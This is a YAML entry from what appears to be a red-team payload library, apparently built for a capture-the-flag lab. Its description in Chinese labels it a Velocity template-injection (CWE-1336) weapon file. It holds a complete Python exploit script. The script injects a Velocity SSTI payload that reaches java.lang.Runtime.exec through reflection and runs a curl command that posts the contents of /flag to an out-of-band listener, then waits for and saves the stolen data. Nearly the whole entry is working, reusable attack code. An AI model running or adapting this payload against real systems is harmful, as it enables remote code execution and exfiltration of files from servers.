- name: velocity-arithmetic-confirmation
  description: 为 CWE-1336（模板注入）新建 Velocity 专项武器库文件，包含算术确认和反射 RCE 两类 payload 模板，并标记适用场景与白名单模块约束。
  lang: python
  template: "import urllib.parse\nfrom redteam_sdk import HttpClient, OOBReceiver,\
    \ save_context\n\nTARGET_URL = \"http://host.docker.internal:9443\"\n\ndef main():\n\
    \    # 初始化 HTTP 客户端\n    client = HttpClient(base_url=TARGET_URL)\n\n    # 启动\
    \ OOB 监听器，接收外带数据\n    oob = OOBReceiver(port=8765)\n    oob_url = oob.url.strip()\n\
    \    print(f\"[*] OOB listener available at: {oob_url}\")\n\n    # 构造 Velocity\
    \ SSTI 有效载荷，执行 curl 命令将 /flag 内容外带\n    # 使用 $class.forName 反射调用 Runtime.exec\n\
    \    payload = (\n        '#set($base=\"' + oob_url + '\")\\n'\n        '#set($cmd=\"\
    sh -c \\\\\"curl -s -X POST --data-binary @/flag $base\\\\\"\")\\n'\n        '#set($runtime=$class.forName(\"\
    java.lang.Runtime\").getRuntime())\\n'\n        '$runtime.exec($cmd)'\n    )\n\
    \n    # 将 payload 作为 text 参数发送到根路径\n    query = urllib.parse.urlencode({\"text\"\
    : payload})\n    try:\n        resp = client.get(\"/?\" + query)\n        # 根据\
    \ SDK 实现打印响应信息，无 response 时忽略\n        if hasattr(resp, \"status_code\"):\n  \
    \          print(f\"[*] Request sent, response status: {resp.status_code}\")\n\
    \        else:\n            print(\"[*] Request sent\")\n    except Exception\
    \ as e:\n        print(f\"[!] HTTP request failed: {e}\")\n\n    # 等待 OOB 回调，捕获外传的\
    \ flag\n    print(\"[*] Waiting for OOB data...\")\n    flag = None\n    try:\n\
    \        # 假设 OOBReceiver 提供 receive 方法，超时 30 秒\n        data = oob.receive(timeout=30)\n\
    \        if data:\n            print(f\"[+] Received data: {data}\")\n       \
    \     flag = data\n        else:\n            print(\"[!] No data received within\
    \ timeout\")\n    except Exception as e:\n        print(f\"[!] Error while receiving\
    \ OOB data: {e}\")\n    finally:\n        # 若存在 close 方法则调用，否则忽略\n        if hasattr(oob,\
    \ \"close\"):\n            oob.close()\n\n    # 保存 flag 内容供后续步骤使用（可选）\n    if\
    \ flag:\n        save_context({\"flag\": flag})\n        print(f\"[+] Flag saved\
    \ in context\")\n    else:\n        print(\"[!] Flag not obtained\")\n\n    print(\"\
    STEP_OK\")\n\nif __name__ == \"__main__\":\n    main()"
